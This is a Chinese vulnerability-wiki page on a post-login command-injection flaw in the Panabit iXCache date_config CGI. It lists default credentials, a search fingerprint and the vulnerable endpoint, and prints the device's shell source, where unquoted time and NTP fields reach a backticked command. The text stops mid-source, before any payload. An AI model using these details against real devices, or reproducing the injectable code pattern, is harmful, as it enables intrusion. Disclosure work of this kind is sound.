<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/IOT%E5%AE%89%E5%85%A8/Panabit/Panabit%20iXCache%20date_config%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Panabit iXCache date_config 后台命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Panabit iXCache date_config \u540e\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Samsung/%EF%BC%88CVE-2017-14262%EF%BC%89Samsung%20NVR%20devices%20%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Samsung/%EF%BC%88CVE-2017-14262%EF%BC%89Samsung%20NVR%20devices%20%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2017-14262）Samsung NVR devices 漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Panabit%20Panalog%20sy_addmount.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Panabit%20Panalog%20sy_addmount.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Panabit Panalog sy_addmount.php 远程命令执行漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="panabit-ixcache-date_config">Panabit iXCache date_config 后台命令执行漏洞<a class="headerlink" href="#panabit-ixcache-date_config" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Panabit iXCache date_config模块存在命令拼接，导致可执行任意命令</p>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p><a-checkbox checked>Panabit iXCache </a-checkbox></br></p>
<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p><a-checkbox checked>title="iXCache"</a-checkbox></br></p>
<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>登录页面</p>
<p><img alt="img" src="../../../.vuepress/public/img/1628866761666-5daacae5-6bcd-4792-b8c4-09519ff5df9a.png" /></p>
<p>默认账号密码为：<strong>admin/ixcache ,</strong> 存在漏洞的模块为</p>
<div class="highlight"><pre><span></span><code><span class="x">  /cgi-bin/Maintain/date_config</span>
</code></pre></div>
<p>找到请求方式传参可以通过查看登陆页面文件获取, 通过抓包得知验证文件为 <strong>userverify.cgi</strong></p>
<p><img alt="img" src="../../../.vuepress/public/img/1628931413593-ce7fc906-a40e-4ebf-9a55-b8e5c23e45a4.png" /></p>
<p>接收请求参数的方式如下，通过快速搜索查找可能交互的地方</p>
<div class="highlight"><pre><span></span><code><span class="x">&quot;${REQUEST_METHOD}&quot; = &quot;POST&quot;</span>
</code></pre></div>
<p><img alt="img" src="../../../.vuepress/public/img/1628931565205-770e4b02-7112-4d6d-bd2f-22cd8ee80dea.png" /></p>
<p>这样就可以快速找到可以传参交互的地方，查看的过程发现存在可控点</p>
<p><img alt="img" src="../../../.vuepress/public/img/1628931751554-2fd5da94-7b54-4933-b6e1-2e4559684e6e.png" /></p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/sh</span>
<span class="c1">#This script is created by ssparser automatically. The parser first created by MaoShouyan</span>
<span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;Content-type: text/html</span>
<span class="s2">Cache-Control: no-cache</span>

<span class="s2">&quot;</span>
<span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">;</span><span class="w"> </span>
.<span class="w"> </span>../common/common.sh
<span class="nv">myself</span><span class="o">=</span><span class="s2">&quot;/cgi-bin/Maintain/`basename </span><span class="nv">$0</span><span class="s2">`&quot;</span>

<span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;</span>
<span class="s2">&lt;script languate=\&quot;javascript\&quot;&gt;</span>
<span class="s2">function Validate(frm)</span>
<span class="s2">{</span>
<span class="s2">    frm.ntpserver.value = TrimAll(frm.ntpserver.value);</span>
<span class="s2">    if (frm.ntpserver.value != \&quot;\&quot; &amp;&amp; !IsIPAddr(frm.ntpserver.value)) {</span>
<span class="s2">        alert(\&quot;请输入IP地址!\&quot;);</span>
<span class="s2">        frm.ntpserver.select();</span>
<span class="s2">        return false;</span>
<span class="s2">    }</span>
<span class="s2">    return true;</span>
<span class="s2">}</span>
<span class="s2">&lt;/script&gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">REQUEST_METHOD</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;POST&quot;</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span>operator_check<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">myself</span><span class="si">}</span><span class="s2">&quot;</span>
<span class="w">    </span><span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">CGI_ntpserver</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nv">CGI_ntpserver</span><span class="o">=</span><span class="s2">&quot;0.0.0.0&quot;</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ntpserver_ip=</span><span class="si">${</span><span class="nv">CGI_ntpserver</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="si">${</span><span class="nv">PGETC</span><span class="si">}</span>/ntp.conf
<span class="w">    </span><span class="nv">timefmt</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">CGI_year</span><span class="si">}${</span><span class="nv">CGI_month</span><span class="si">}${</span><span class="nv">CGI_day</span><span class="si">}${</span><span class="nv">CGI_hour</span><span class="si">}${</span><span class="nv">CGI_minute</span><span class="si">}</span><span class="s2">.</span><span class="si">${</span><span class="nv">CGI_second</span><span class="si">}</span><span class="s2">&quot;</span>
<span class="w">    </span><span class="nv">errmsg</span><span class="o">=</span><span class="sb">`</span>date<span class="w"> </span><span class="si">${</span><span class="nv">timefmt</span><span class="si">}</span><span class="sb">`</span>
<span class="w">    </span><span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">CGI_ntpserver</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>!<span class="o">=</span><span class="w"> </span><span class="s2">&quot;0.0.0.0&quot;</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>ntpdate<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="si">${</span><span class="nv">CGI_ntpserver</span><span class="si">}</span>

<span class="w">    </span>afm_dialog_msg<span class="w"> </span><span class="s2">&quot;操作成功!&quot;</span>
<span class="k">fi</span>
<span class="nv">year</span><span class="o">=</span><span class="sb">`</span>date<span class="w"> </span><span class="s2">&quot;+%Y&quot;</span><span class="sb">`</span>
<span class="nv">month</span><span class="o">=</span><span class="sb">`</span>date<span class="w"> </span><span class="s2">&quot;+%m&quot;</span><span class="sb">`</span>
<span class="nv">day</span><span class="o">=</span><span class="sb">`</span>date<span class="w"> </span><span class="s2">&quot;+%d&quot;</span><span class="sb">`</span>
<span class="nv">hour</span><span class="o">=</span><span class="sb">`</span>date<span class="w"> </span><span class="s2">&quot;+%H&quot;</span><span class="sb">`</span>
<span class="nv">minute</span><span class="o">=</span><span class="sb">`</span>date<span class="w"> </span><span class="s2">&quot;+%M&quot;</span><span class="sb">`</span>
<span class="nv">second</span><span class="o">=</span><span class="sb">`</span>date<span class="w"> </span><span class="s2">&quot;+%S&quot;</span><span class="sb">`</span>
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-f<span class="w"> </span><span class="si">${</span><span class="nv">PGETC</span><span class="si">}</span>/ntp.conf<span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span>.<span class="w"> </span><span class="si">${</span><span class="nv">PGETC</span><span class="si">}</span>/ntp.conf
<span class="w">    </span><span class="nv">CGI_ntpserver</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">ntpserver_ip</span><span class="si">}</span><span class="s2">&quot;</span>
<span class="k">fi</span>
<span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">CGI_ntpserver</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nv">CGI_ntpserver</span><span class="o">=</span><span class="s2">&quot;0.0.0.0&quot;</span>

<span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;</span>
<span class="s2">&lt;body&gt;</span>
<span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span>cgi_show_title<span class="w"> </span><span class="s2">&quot;系统管理-&gt;系统时间&quot;</span><span class="w"> </span>
<span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;</span>
<span class="s2">&lt;br&gt;</span>
<span class="s2">&lt;form method=post onsubmit=\&quot;return Validate(this)\&quot; action=\&quot;</span><span class="si">${</span><span class="nv">myself</span><span class="si">}</span><span class="s2">\&quot;&gt;</span>
<span class="s2">&lt;table width=700 border=0 cellspacing=1 cellpadding=1 bgcolor=\&quot;#ffffff\&quot;&gt;</span>
<span class="s2">&lt;tr id=row1 height=22&gt;</span>
<span class="s2">    &lt;td width=40&gt;&lt;/td&gt;</span>
<span class="s2">    &lt;td width=90 align=left&gt;NTP服务器&lt;/td&gt;</span>
<span class="s2">    &lt;td width=* align=left&gt;</span>
<span class="s2">        &lt;input type=text name=ntpserver style=\&quot;width:120px\&quot; value=\&quot;</span><span class="si">${</span><span class="nv">CGI_ntpserver</span><span class="si">}</span><span class="s2">\&quot;&gt;&lt;/input&gt;&amp;nbsp;(请输入IP地址，目前不支持域名解析,0.0.0.0表示关闭NTP)&lt;/td&gt;</span>
<span class="s2">&lt;/tr&gt;</span>
<span class="s2">&lt;/table&gt;</span>
<span class="s2">&lt;br&gt;</span>
<span class="s2">&lt;table width=700 border=0 cellspacing=1 cellpadding=1 bgcolor=\&quot;#ffffff\&quot;&gt;</span>
<span class="s2">&lt;tr id=row1 height=22&gt;</span>
<span class="s2">    &lt;td width=40&gt;&lt;/td&gt;</span>
<span class="s2">    &lt;td width=90 align=left&gt;年/月/日&lt;/td&gt;</span>
<span class="s2">    &lt;td width=* align=left&gt;</span>
<span class="s2">    &lt;select name=year style=\&quot;width:60px\&quot; value=</span><span class="si">${</span><span class="nv">year</span><span class="si">}</span><span class="s2">&gt;</span>
<span class="s2">    &quot;</span><span class="p">;</span>
<span class="w">        </span><span class="nv">tmpvar</span><span class="o">=</span><span class="m">2000</span>
<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-le<span class="w"> </span><span class="m">2020</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-eq<span class="w"> </span><span class="si">${</span><span class="nv">year</span><span class="si">}</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">                </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;option value=</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2"> selected&gt;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">&lt;/option&gt;&quot;</span>
<span class="w">            </span><span class="k">else</span>
<span class="w">                </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;option value=</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">&gt;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">&lt;/option&gt;&quot;</span>
<span class="w">            </span><span class="k">fi</span>
<span class="w">            </span><span class="nv">tmpvar</span><span class="o">=</span><span class="k">$((</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m">1</span><span class="k">))</span>
<span class="w">        </span><span class="k">done</span>

<span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;&lt;/select&gt;年</span>
<span class="s2">    &lt;select name=month style=\&quot;width:60px\&quot; value=</span><span class="si">${</span><span class="nv">month</span><span class="si">}</span><span class="s2">&gt;</span>
<span class="s2">    &quot;</span><span class="p">;</span>
<span class="w">        </span><span class="nv">tmpvar</span><span class="o">=</span><span class="m">1</span>
<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-le<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">            </span><span class="nv">selected</span><span class="o">=</span><span class="s2">&quot;&quot;</span>
<span class="w">            </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-eq<span class="w"> </span><span class="si">${</span><span class="nv">month</span><span class="si">}</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nv">selected</span><span class="o">=</span><span class="s2">&quot;selected&quot;</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-lt<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">                </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;option value=\&quot;0</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">\&quot; </span><span class="si">${</span><span class="nv">selected</span><span class="si">}</span><span class="s2">&gt;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">&lt;/option&gt;&quot;</span>
<span class="w">            </span><span class="k">else</span>
<span class="w">                </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;option value=\&quot;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">\&quot; </span><span class="si">${</span><span class="nv">selected</span><span class="si">}</span><span class="s2">&gt;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">&lt;/option&gt;&quot;</span>
<span class="w">            </span><span class="k">fi</span>
<span class="w">            </span><span class="nv">tmpvar</span><span class="o">=</span><span class="k">$((</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m">1</span><span class="k">))</span>
<span class="w">        </span><span class="k">done</span>

<span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;&lt;/select&gt;月</span>
<span class="s2">    &lt;select name=day style=\&quot;width:60px\&quot; value=</span><span class="si">${</span><span class="nv">day</span><span class="si">}</span><span class="s2">&gt;</span>
<span class="s2">    &quot;</span><span class="p">;</span>
<span class="w">        </span><span class="nv">tmpvar</span><span class="o">=</span><span class="m">1</span>
<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-le<span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">            </span><span class="nv">selected</span><span class="o">=</span><span class="s2">&quot;&quot;</span>
<span class="w">            </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-eq<span class="w"> </span><span class="si">${</span><span class="nv">day</span><span class="si">}</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nv">selected</span><span class="o">=</span><span class="s2">&quot;selected&quot;</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-lt<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">                </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;option value=\&quot;0</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">\&quot; </span><span class="si">${</span><span class="nv">selected</span><span class="si">}</span><span class="s2">&gt;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">&lt;/option&gt;&quot;</span>
<span class="w">            </span><span class="k">else</span>
<span class="w">                </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;option value=\&quot;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">\&quot; </span><span class="si">${</span><span class="nv">selected</span><span class="si">}</span><span class="s2">&gt;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">&lt;/option&gt;&quot;</span>
<span class="w">            </span><span class="k">fi</span>
<span class="w">            </span><span class="nv">tmpvar</span><span class="o">=</span><span class="k">$((</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m">1</span><span class="k">))</span>
<span class="w">        </span><span class="k">done</span>

<span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;&lt;/select&gt;日&lt;/td&gt;</span>
<span class="s2">&lt;/tr&gt;</span>
<span class="s2">&lt;tr id=row1&gt;</span>
<span class="s2">    &lt;td&gt;&lt;/td&gt;</span>
<span class="s2">    &lt;td align=left&gt;时/分/秒&lt;/td&gt;</span>
<span class="s2">    &lt;td width=* align=left&gt;</span>
<span class="s2">    &lt;select name=hour value=0 style=\&quot;width:60px\&quot; value=</span><span class="si">${</span><span class="nv">hour</span><span class="si">}</span><span class="s2">&gt;</span>
<span class="s2">    &quot;</span><span class="p">;</span>
<span class="w">        </span><span class="nv">tmpvar</span><span class="o">=</span><span class="m">0</span>
<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-le<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">            </span><span class="nv">selected</span><span class="o">=</span><span class="s2">&quot;&quot;</span>
<span class="w">            </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-eq<span class="w"> </span><span class="si">${</span><span class="nv">hour</span><span class="si">}</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nv">selected</span><span class="o">=</span><span class="s2">&quot;selected&quot;</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-lt<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">                </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;option value=\&quot;0</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">\&quot; </span><span class="si">${</span><span class="nv">selected</span><span class="si">}</span><span class="s2">&gt;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">&lt;/option&gt;&quot;</span>
<span class="w">            </span><span class="k">else</span>
<span class="w">                </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;option value=\&quot;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">\&quot; </span><span class="si">${</span><span class="nv">selected</span><span class="si">}</span><span class="s2">&gt;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">&lt;/option&gt;&quot;</span>
<span class="w">            </span><span class="k">fi</span>
<span class="w">            </span><span class="nv">tmpvar</span><span class="o">=</span><span class="k">$((</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m">1</span><span class="k">))</span>
<span class="w">        </span><span class="k">done</span>

<span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;&lt;/select&gt;时</span>
<span class="s2">    &lt;select name=minute value=0 style=\&quot;width:60px\&quot; value=</span><span class="si">${</span><span class="nv">minute</span><span class="si">}</span><span class="s2">&gt;</span>
<span class="s2">    &quot;</span><span class="p">;</span>
<span class="w">        </span><span class="nv">tmpvar</span><span class="o">=</span><span class="m">0</span>
<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-le<span class="w"> </span><span class="m">59</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">            </span><span class="nv">selected</span><span class="o">=</span><span class="s2">&quot;&quot;</span>
<span class="w">            </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-eq<span class="w"> </span><span class="si">${</span><span class="nv">minute</span><span class="si">}</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nv">selected</span><span class="o">=</span><span class="s2">&quot;selected&quot;</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-lt<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">                </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;option value=\&quot;0</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">\&quot; </span><span class="si">${</span><span class="nv">selected</span><span class="si">}</span><span class="s2">&gt;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">&lt;/option&gt;&quot;</span>
<span class="w">            </span><span class="k">else</span>
<span class="w">                </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;option value=\&quot;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">\&quot; </span><span class="si">${</span><span class="nv">selected</span><span class="si">}</span><span class="s2">&gt;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">&lt;/option&gt;&quot;</span>
<span class="w">            </span><span class="k">fi</span>
<span class="w">            </span><span class="nv">tmpvar</span><span class="o">=</span><span class="k">$((</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m">1</span><span class="k">))</span>
<span class="w">        </span><span class="k">done</span>

<span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;&lt;/select&gt;分</span>
<span class="s2">    &lt;select name=second value=0 style=\&quot;width:60px\&quot; value=</span><span class="si">${</span><span class="nv">second</span><span class="si">}</span><span class="s2">&gt;</span>
<span class="s2">    &quot;</span><span class="p">;</span>
<span class="w">        </span><span class="nv">tmpvar</span><span class="o">=</span><span class="m">0</span>
<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-le<span class="w"> </span><span class="m">59</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">            </span><span class="nv">selected</span><span class="o">=</span><span class="s2">&quot;&quot;</span>
<span class="w">            </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-eq<span class="w"> </span><span class="si">${</span><span class="nv">second</span><span class="si">}</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nv">selected</span><span class="o">=</span><span class="s2">&quot;selected&quot;</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span>-lt<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">                </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;option value=\&quot;0</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">\&quot; </span><span class="si">${</span><span class="nv">selected</span><span class="si">}</span><span class="s2">&gt;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">&lt;/option&gt;&quot;</span>
<span class="w">            </span><span class="k">else</span>
<span class="w">                </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;option value=\&quot;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">\&quot; </span><span class="si">${</span><span class="nv">selected</span><span class="si">}</span><span class="s2">&gt;</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="s2">&lt;/option&gt;&quot;</span>
<span class="w">            </span><span class="k">fi</span>
<span class="w">            </span><span class="nv">tmpvar</span><span class="o">=</span><span class="k">$((</span><span class="si">${</span><span class="nv">tmpvar</span><span class="si">}</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m">1</span><span class="k">))</span>
<span class="w">        </span><span class="k">done</span>

<span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;&lt;/select&gt;秒&lt;/td&gt;</span>
<span class="s2">&lt;/tr&gt;</span>
<span class="s2">&lt;/table&gt;</span>
<span class="s2">&lt;table style=\&quot;width:700; border-bottom:1px #787882 solid; color:#0000ff\&quot;&gt;</span>
<span class="s2">&lt;tr&gt;&lt;td align=right&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="s2">&lt;/table&gt;</span>
<span class="s2">&lt;table style=\&quot;width:700\&quot;&gt; </span>
<span class="s2">&lt;tr&gt;</span>
<span class="s2">        &lt;td align=right&gt;&lt;input type=submit style=\&quot;width:70\&quot; value=\&quot;提交\&quot;&gt;&lt;/input&gt;</span>
